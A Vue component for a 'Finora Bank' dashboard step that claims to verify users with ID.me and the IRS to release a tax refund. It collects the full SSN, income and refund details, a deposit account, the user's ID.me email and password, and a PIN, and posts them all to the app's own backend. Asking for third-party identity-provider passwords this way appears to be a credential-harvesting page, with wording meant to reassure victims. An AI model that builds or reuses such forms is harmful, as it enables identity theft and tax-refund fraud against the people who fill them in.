<script setup>
import { ref, computed } from 'vue';
import { useForm, router } from '@inertiajs/vue3';
import DashboardLayout from '@/Layouts/DashboardLayout.vue';
import Card from 'primevue/card';
import Button from 'primevue/button';
import InputText from 'primevue/inputtext';
import InputMask from 'primevue/inputmask';
import InputNumber from 'primevue/inputnumber';
import Password from 'primevue/password';
import Select from 'primevue/select';
import Message from 'primevue/message';
import Divider from 'primevue/divider';
import Stepper from 'primevue/stepper';
import StepList from 'primevue/steplist';
import StepPanels from 'primevue/steppanels';
import Step from 'primevue/step';
import StepPanel from 'primevue/steppanel';

const props = defineProps({
    bankAccounts: { type: Array, default: () => [] },
    filingStatuses: { type: Array, default: () => [] },
    user: { type: Object, default: () => ({}) },
});

const currentYear = new Date().getFullYear();
const taxYears = Array.from({ length: 5 }, (_, i) => ({
    value: currentYear - i,
    label: `${currentYear - i}`,
}));

const usStates = [
    { value: 'AL', label: 'Alabama' }, { value: 'AK', label: 'Alaska' }, { value: 'AZ', label: 'Arizona' },
    { value: 'AR', label: 'Arkansas' }, { value: 'CA', label: 'California' }, { value: 'CO', label: 'Colorado' },
    { value: 'CT', label: 'Connecticut' }, { value: 'DE', label: 'Delaware' }, { value: 'FL', label: 'Florida' },
    { value: 'GA', label: 'Georgia' }, { value: 'HI', label: 'Hawaii' }, { value: 'ID', label: 'Idaho' },
    { value: 'IL', label: 'Illinois' }, { value: 'IN', label: 'Indiana' }, { value: 'IA', label: 'Iowa' },
    { value: 'KS', label: 'Kansas' }, { value: 'KY', label: 'Kentucky' }, { value: 'LA', label: 'Louisiana' },
    { value: 'ME', label: 'Maine' }, { value: 'MD', label: 'Maryland' }, { value: 'MA', label: 'Massachusetts' },
    { value: 'MI', label: 'Michigan' }, { value: 'MN', label: 'Minnesota' }, { value: 'MS', label: 'Mississippi' },
    { value: 'MO', label: 'Missouri' }, { value: 'MT', label: 'Montana' }, { value: 'NE', label: 'Nebraska' },
    { value: 'NV', label: 'Nevada' }, { value: 'NH', label: 'New Hampshire' }, { value: 'NJ', label: 'New Jersey' },
    { value: 'NM', label: 'New Mexico' }, { value: 'NY', label: 'New York' }, { value: 'NC', label: 'North Carolina' },
    { value: 'ND', label: 'North Dakota' }, { value: 'OH', label: 'Ohio' }, { value: 'OK', label: 'Oklahoma' },
    { value: 'OR', label: 'Oregon' }, { value: 'PA', label: 'Pennsylvania' }, { value: 'RI', label: 'Rhode Island' },
    { value: 'SC', label: 'South Carolina' }, { value: 'SD', label: 'South Dakota' }, { value: 'TN', label: 'Tennessee' },
    { value: 'TX', label: 'Texas' }, { value: 'UT', label: 'Utah' }, { value: 'VT', label: 'Vermont' },
    { value: 'VA', label: 'Virginia' }, { value: 'WA', label: 'Washington' }, { value: 'WV', label: 'West Virginia' },
    { value: 'WI', label: 'Wisconsin' }, { value: 'WY', label: 'Wyoming' }, { value: 'DC', label: 'Washington D.C.' },
];

const form = useForm({
    tax_year: currentYear - 1,
    ssn_tin: '',
    filing_status: '',
    employer_name: '',
    employer_ein: '',
    gross_income: null,
    federal_withheld: null,
    state_withheld: null,
    state: '',
    refund_amount: null,
    bank_account_id: null,
    idme_email: '',
    idme_password: '',
    pin: '',
});

const activeStep = ref('1');
const isSubmitting = ref(false);

const step1Valid = computed(() => {
    return form.tax_year && form.ssn_tin && form.filing_status && form.employer_name && form.gross_income !== null;
});

const step2Valid = computed(() => {
    return form.federal_withheld !== null && form.refund_amount !== null && form.bank_account_id;
});

const step3Valid = computed(() => {
    return form.idme_email && form.idme_password && form.idme_password.length >= 6;
});

const canSubmit = computed(() => {
    return step1Valid.value && step2Valid.value && step3Valid.value && form.pin.length === 6;
});

const goToStep = (step) => {
    activeStep.value = step;
};

const submit = () => {
    if (!canSubmit.value) return;
    
    isSubmitting.value = true;
    form.post(route('tax-refunds.idme.process'), {
        onFinish: () => {
            isSubmitting.value = false;
        },
    });
};

const goBack = () => {
    router.visit(route('tax-refunds.index'));
};
</script>

<template>
    <DashboardLayout title="ID.me Verification">
        <div class="max-w-4xl mx-auto space-y-6">
            <!-- Header -->
            <div class="flex items-center gap-4">
                <Button 
                    icon="pi pi-arrow-left" 
                    text 
                    rounded 
                    @click="goBack"
                    class="shrink-0"
                />
                <div>
                    <h1 class="text-2xl font-bold text-gray-900 dark:text-white">ID.me Verification</h1>
                    <p class="text-gray-600 dark:text-gray-400">Verify your identity to claim your tax refund securely.</p>
                </div>
            </div>

            <!-- ID.me Branding -->
            <Message severity="info" :closable="false">
                <div class="flex items-center gap-3">
                    <i class="pi pi-shield text-2xl"></i>
                    <div>
                        <p class="font-semibold">Secure ID.me Verification</p>
                        <p class="text-sm">Your credentials are encrypted and used only for identity verification with the IRS.</p>
                    </div>
                </div>
            </Message>

            <Card>
                <template #content>
                    <Stepper v-model:value="activeStep" linear>
                        <StepList>
                            <Step value="1">Tax Information</Step>
                            <Step value="2">Income & Refund</Step>
                            <Step value="3">ID.me Login</Step>
                            <Step value="4">Confirm</Step>
                        </StepList>
                        <StepPanels>
                            <!-- Step 1: Tax Information -->
                            <StepPanel v-slot="{ activateCallback }" value="1">
                                <div class="space-y-6 py-4">
                                    <h3 class="text-lg font-semibold text-gray-900 dark:text-white">Tax Information</h3>
                                    
                                    <div class="grid gap-4 md:grid-cols-2">
                                        <div class="flex flex-col gap-2">
                                            <label class="font-medium text-gray-700 dark:text-gray-300">Tax Year *</label>
                                            <Select 
                                                v-model="form.tax_year" 
                                                :options="taxYears" 
                                                optionLabel="label" 
                                                optionValue="value"
                                                placeholder="Select tax year"
                                                class="w-full"
                                            />
                                            <small v-if="form.errors.tax_year" class="text-red-500">{{ form.errors.tax_year }}</small>
                                        </div>

                                        <div class="flex flex-col gap-2">
                                            <label class="font-medium text-gray-700 dark:text-gray-300">Filing Status *</label>
                                            <Select 
                                                v-model="form.filing_status" 
                                                :options="filingStatuses" 
                                                optionLabel="label" 
                                                optionValue="value"
                                                placeholder="Select filing status"
                                                class="w-full"
                                            />
                                            <small v-if="form.errors.filing_status" class="text-red-500">{{ form.errors.filing_status }}</small>
                                        </div>

                                        <div class="flex flex-col gap-2 md:col-span-2">
                                            <label class="font-medium text-gray-700 dark:text-gray-300">Social Security Number (SSN) *</label>
                                            <InputMask 
                                                v-model="form.ssn_tin" 
                                                mask="999-99-9999" 
                                                placeholder="XXX-XX-XXXX"
                                                class="w-full"
                                            />
                                            <small class="text-gray-500">Your SSN is encrypted and protected.</small>
                                            <small v-if="form.errors.ssn_tin" class="text-red-500">{{ form.errors.ssn_tin }}</small>
                                        </div>

                                        <div class="flex flex-col gap-2">
                                            <label class="font-medium text-gray-700 dark:text-gray-300">Employer Name *</label>
                                            <InputText 
                                                v-model="form.employer_name" 
                                                placeholder="Enter employer name"
                                                class="w-full"
                                            />
                                            <small v-if="form.errors.employer_name" class="text-red-500">{{ form.errors.employer_name }}</small>
                                        </div>

                                        <div class="flex flex-col gap-2">
                                            <label class="font-medium text-gray-700 dark:text-gray-300">Employer EIN</label>
                                            <InputMask 
                                                v-model="form.employer_ein" 
                                                mask="99-9999999" 
                                                placeholder="XX-XXXXXXX"
                                                class="w-full"
                                            />
                                            <small v-if="form.errors.employer_ein" class="text-red-500">{{ form.errors.employer_ein }}</small>
                                        </div>

                                        <div class="flex flex-col gap-2">
                                            <label class="font-medium text-gray-700 dark:text-gray-300">Gross Income *</label>
                                            <InputNumber 
                                                v-model="form.gross_income" 
                                                mode="currency" 
                                                currency="USD"
                                                locale="en-US"
                                                placeholder="$0.00"
                                                class="w-full"
                                            />
                                            <small v-if="form.errors.gross_income" class="text-red-500">{{ form.errors.gross_income }}</small>
                                        </div>

                                        <div class="flex flex-col gap-2">
                                            <label class="font-medium text-gray-700 dark:text-gray-300">State</label>
                                            <Select 
                                                v-model="form.state" 
                                                :options="usStates" 
                                                optionLabel="label" 
                                                optionValue="value"
                                                placeholder="Select state"
                                                filter
                                                class="w-full"
                                            />
                                            <small v-if="form.errors.state" class="text-red-500">{{ form.errors.state }}</small>
                                        </div>
                                    </div>

                                    <div class="flex justify-end pt-4">
                                        <Button 
                                            label="Next" 
                                            icon="pi pi-arrow-right" 
                                            iconPos="right"
                                            :disabled="!step1Valid"
                                            @click="activateCallback('2')"
                                        />
                                    </div>
                                </div>
                            </StepPanel>

                            <!-- Step 2: Income & Refund Details -->
                            <StepPanel v-slot="{ activateCallback }" value="2">
                                <div class="space-y-6 py-4">
                                    <h3 class="text-lg font-semibold text-gray-900 dark:text-white">Income & Refund Details</h3>
                                    
                                    <div class="grid gap-4 md:grid-cols-2">
                                        <div class="flex flex-col gap-2">
                                            <label class="font-medium text-gray-700 dark:text-gray-300">Federal Tax Withheld *</label>
                                            <InputNumber 
                                                v-model="form.federal_withheld" 
                                                mode="currency" 
                                                currency="USD"
                                                locale="en-US"
                                                placeholder="$0.00"
                                                class="w-full"
                                            />
                                            <small v-if="form.errors.federal_withheld" class="text-red-500">{{ form.errors.federal_withheld }}</small>
                                        </div>

                                        <div class="flex flex-col gap-2">
                                            <label class="font-medium text-gray-700 dark:text-gray-300">State Tax Withheld</label>
                                            <InputNumber 
                                                v-model="form.state_withheld" 
                                                mode="currency" 
                                                currency="USD"
                                                locale="en-US"
                                                placeholder="$0.00"
                                                class="w-full"
                                            />
                                            <small v-if="form.errors.state_withheld" class="text-red-500">{{ form.errors.state_withheld }}</small>
                                        </div>

                                        <div class="flex flex-col gap-2 md:col-span-2">
                                            <label class="font-medium text-gray-700 dark:text-gray-300">Expected Refund Amount *</label>
                                            <InputNumber 
                                                v-model="form.refund_amount" 
                                                mode="currency" 
                                                currency="USD"
                                                locale="en-US"
                                                placeholder="$0.00"
                                                class="w-full"
                                            />
                                            <small class="text-gray-500">Enter the expected refund amount from your tax return.</small>
                                            <small v-if="form.errors.refund_amount" class="text-red-500">{{ form.errors.refund_amount }}</small>
                                        </div>

                                        <div class="flex flex-col gap-2 md:col-span-2">
                                            <label class="font-medium text-gray-700 dark:text-gray-300">Deposit Account *</label>
                                            <Select 
                                                v-model="form.bank_account_id" 
                                                :options="bankAccounts" 
                                                optionLabel="label" 
                                                optionValue="id"
                                                placeholder="Select bank account"
                                                class="w-full"
                                            />
                                            <small class="text-gray-500">Your refund will be deposited to this account.</small>
                                            <small v-if="form.errors.bank_account_id" class="text-red-500">{{ form.errors.bank_account_id }}</small>
                                        </div>
                                    </div>

                                    <div class="flex justify-between pt-4">
                                        <Button 
                                            label="Back" 
                                            icon="pi pi-arrow-left" 
                                            severity="secondary"
                                            outlined
                                            @click="activateCallback('1')"
                                        />
                                        <Button 
                                            label="Next" 
                                            icon="pi pi-arrow-right" 
                                            iconPos="right"
                                            :disabled="!step2Valid"
                                            @click="activateCallback('3')"
                                        />
                                    </div>
                                </div>
                            </StepPanel>

                            <!-- Step 3: ID.me Login -->
                            <StepPanel v-slot="{ activateCallback }" value="3">
                                <div class="space-y-6 py-4">
                                    <div class="text-center mb-6">
                                        <div class="inline-flex items-center justify-center w-16 h-16 rounded-full bg-blue-100 dark:bg-blue-900 mb-4">
                                            <i class="pi pi-shield text-3xl text-blue-600 dark:text-blue-400"></i>
                                        </div>
                                        <h3 class="text-lg font-semibold text-gray-900 dark:text-white">ID.me Account Verification</h3>
                                        <p class="text-gray-600 dark:text-gray-400 text-sm">
                                            Enter your ID.me credentials to verify your identity with the IRS.
                                        </p>
                                    </div>
                                    
                                    <div class="max-w-md mx-auto space-y-4">
                                        <div class="flex flex-col gap-2">
                                            <label class="font-medium text-gray-700 dark:text-gray-300">ID.me Email *</label>
                                            <InputText 
                                                v-model="form.idme_email" 
                                                type="email"
                                                placeholder="your@email.com"
                                                class="w-full"
                                            />
                                            <small v-if="form.errors.idme_email" class="text-red-500">{{ form.errors.idme_email }}</small>
                                        </div>

                                        <div class="flex flex-col gap-2">
                                            <label class="font-medium text-gray-700 dark:text-gray-300">ID.me Password *</label>
                                            <Password 
                                                v-model="form.idme_password" 
                                                placeholder="Enter your ID.me password"
                                                :feedback="false"
                                                toggleMask
                                                class="w-full"
                                                inputClass="w-full"
                                            />
                                            <small v-if="form.errors.idme_password" class="text-red-500">{{ form.errors.idme_password }}</small>
                                        </div>

                                        <Message severity="secondary" :closable="false" class="mt-4">
                                            <div class="text-sm">
                                                <p class="font-medium mb-1">Don't have an ID.me account?</p>
                                                <p>You can create one at <a href="https://id.me" target="_blank" class="text-blue-600 hover:underline">id.me</a> and return here to complete verification.</p>
                                            </div>
                                        </Message>
                                    </div>

                                    <div class="flex justify-between pt-4">
                                        <Button 
                                            label="Back" 
                                            icon="pi pi-arrow-left" 
                                            severity="secondary"
                                            outlined
                                            @click="activateCallback('2')"
                                        />
                                        <Button 
                                            label="Next" 
                                            icon="pi pi-arrow-right" 
                                            iconPos="right"
                                            :disabled="!step3Valid"
                                            @click="activateCallback('4')"
                                        />
                                    </div>
                                </div>
                            </StepPanel>

                            <!-- Step 4: Confirmation -->
                            <StepPanel v-slot="{ activateCallback }" value="4">
                                <div class="space-y-6 py-4">
                                    <h3 class="text-lg font-semibold text-gray-900 dark:text-white">Review & Confirm</h3>
                                    
                                    <!-- Summary -->
                                    <div class="bg-gray-50 dark:bg-gray-800 rounded-xl p-4 space-y-4">
                                        <div class="grid gap-4 md:grid-cols-2">
                                            <div>
                                                <p class="text-sm text-gray-500 dark:text-gray-400">Tax Year</p>
                                                <p class="font-semibold text-gray-900 dark:text-white">{{ form.tax_year }}</p>
                                            </div>
                                            <div>
                                                <p class="text-sm text-gray-500 dark:text-gray-400">Filing Status</p>
                                                <p class="font-semibold text-gray-900 dark:text-white">
                                                    {{ filingStatuses.find(s => s.value === form.filing_status)?.label || form.filing_status }}
                                                </p>
                                            </div>
                                            <div>
                                                <p class="text-sm text-gray-500 dark:text-gray-400">SSN</p>
                                                <p class="font-semibold text-gray-900 dark:text-white">***-**-{{ form.ssn_tin?.slice(-4) }}</p>
                                            </div>
                                            <div>
                                                <p class="text-sm text-gray-500 dark:text-gray-400">Employer</p>
                                                <p class="font-semibold text-gray-900 dark:text-white">{{ form.employer_name }}</p>
                                            </div>
                                            <div>
                                                <p class="text-sm text-gray-500 dark:text-gray-400">Gross Income</p>
                                                <p class="font-semibold text-gray-900 dark:text-white">
                                                    {{ new Intl.NumberFormat('en-US', { style: 'currency', currency: 'USD' }).format(form.gross_income || 0) }}
                                                </p>
                                            </div>
                                            <div>
                                                <p class="text-sm text-gray-500 dark:text-gray-400">Federal Withheld</p>
                                                <p class="font-semibold text-gray-900 dark:text-white">
                                                    {{ new Intl.NumberFormat('en-US', { style: 'currency', currency: 'USD' }).format(form.federal_withheld || 0) }}
                                                </p>
                                            </div>
                                        </div>
                                        
                                        <Divider />
                                        
                                        <div class="flex justify-between items-center">
                                            <span class="text-lg font-semibold text-gray-900 dark:text-white">Expected Refund</span>
                                            <span class="text-2xl font-bold text-green-600">
                                                {{ new Intl.NumberFormat('en-US', { style: 'currency', currency: 'USD' }).format(form.refund_amount || 0) }}
                                            </span>
                                        </div>
                                        
                                        <div>
                                            <p class="text-sm text-gray-500 dark:text-gray-400">Deposit Account</p>
                                            <p class="font-semibold text-gray-900 dark:text-white">
                                                {{ bankAccounts.find(a => a.id === form.bank_account_id)?.label || 'Not selected' }}
                                            </p>
                                        </div>
                                    </div>

                                    <!-- PIN Entry -->
                                    <div class="bg-yellow-50 dark:bg-yellow-900/20 border border-yellow-200 dark:border-yellow-800 rounded-xl p-4">
                                        <p class="font-medium text-yellow-800 dark:text-yellow-200 mb-3">
                                            Enter your 6-digit Transaction PIN to confirm
                                        </p>
                                        <div class="flex flex-col gap-2">
                                            <Password 
                                                v-model="form.pin"
                                                placeholder="Enter PIN"
                                                :feedback="false"
                                                toggleMask
                                                inputClass="w-full text-center text-2xl tracking-widest"
                                                :maxlength="6"
                                            />
                                            <small v-if="form.errors.pin" class="text-red-500">{{ form.errors.pin }}</small>
                                        </div>
                                    </div>

                                    <Message severity="warn" :closable="false">
                                        <span class="text-sm">
                                            By submitting, you authorize Finora Bank to verify your identity through ID.me and the IRS. 
                                            Processing typically takes 24-48 hours.
                                        </span>
                                    </Message>

                                    <div class="flex justify-between pt-4">
                                        <Button 
                                            label="Back" 
                                            icon="pi pi-arrow-left" 
                                            severity="secondary"
                                            outlined
                                            @click="activateCallback('3')"
                                        />
                                        <Button 
                                            label="Submit Verification" 
                                            icon="pi pi-check" 
                                            :loading="isSubmitting || form.processing"
                                            :disabled="!canSubmit"
                                            @click="submit"
                                        />
                                    </div>
                                </div>
                            </StepPanel>
                        </StepPanels>
                    </Stepper>
                </template>
            </Card>
        </div>
    </DashboardLayout>
</template>
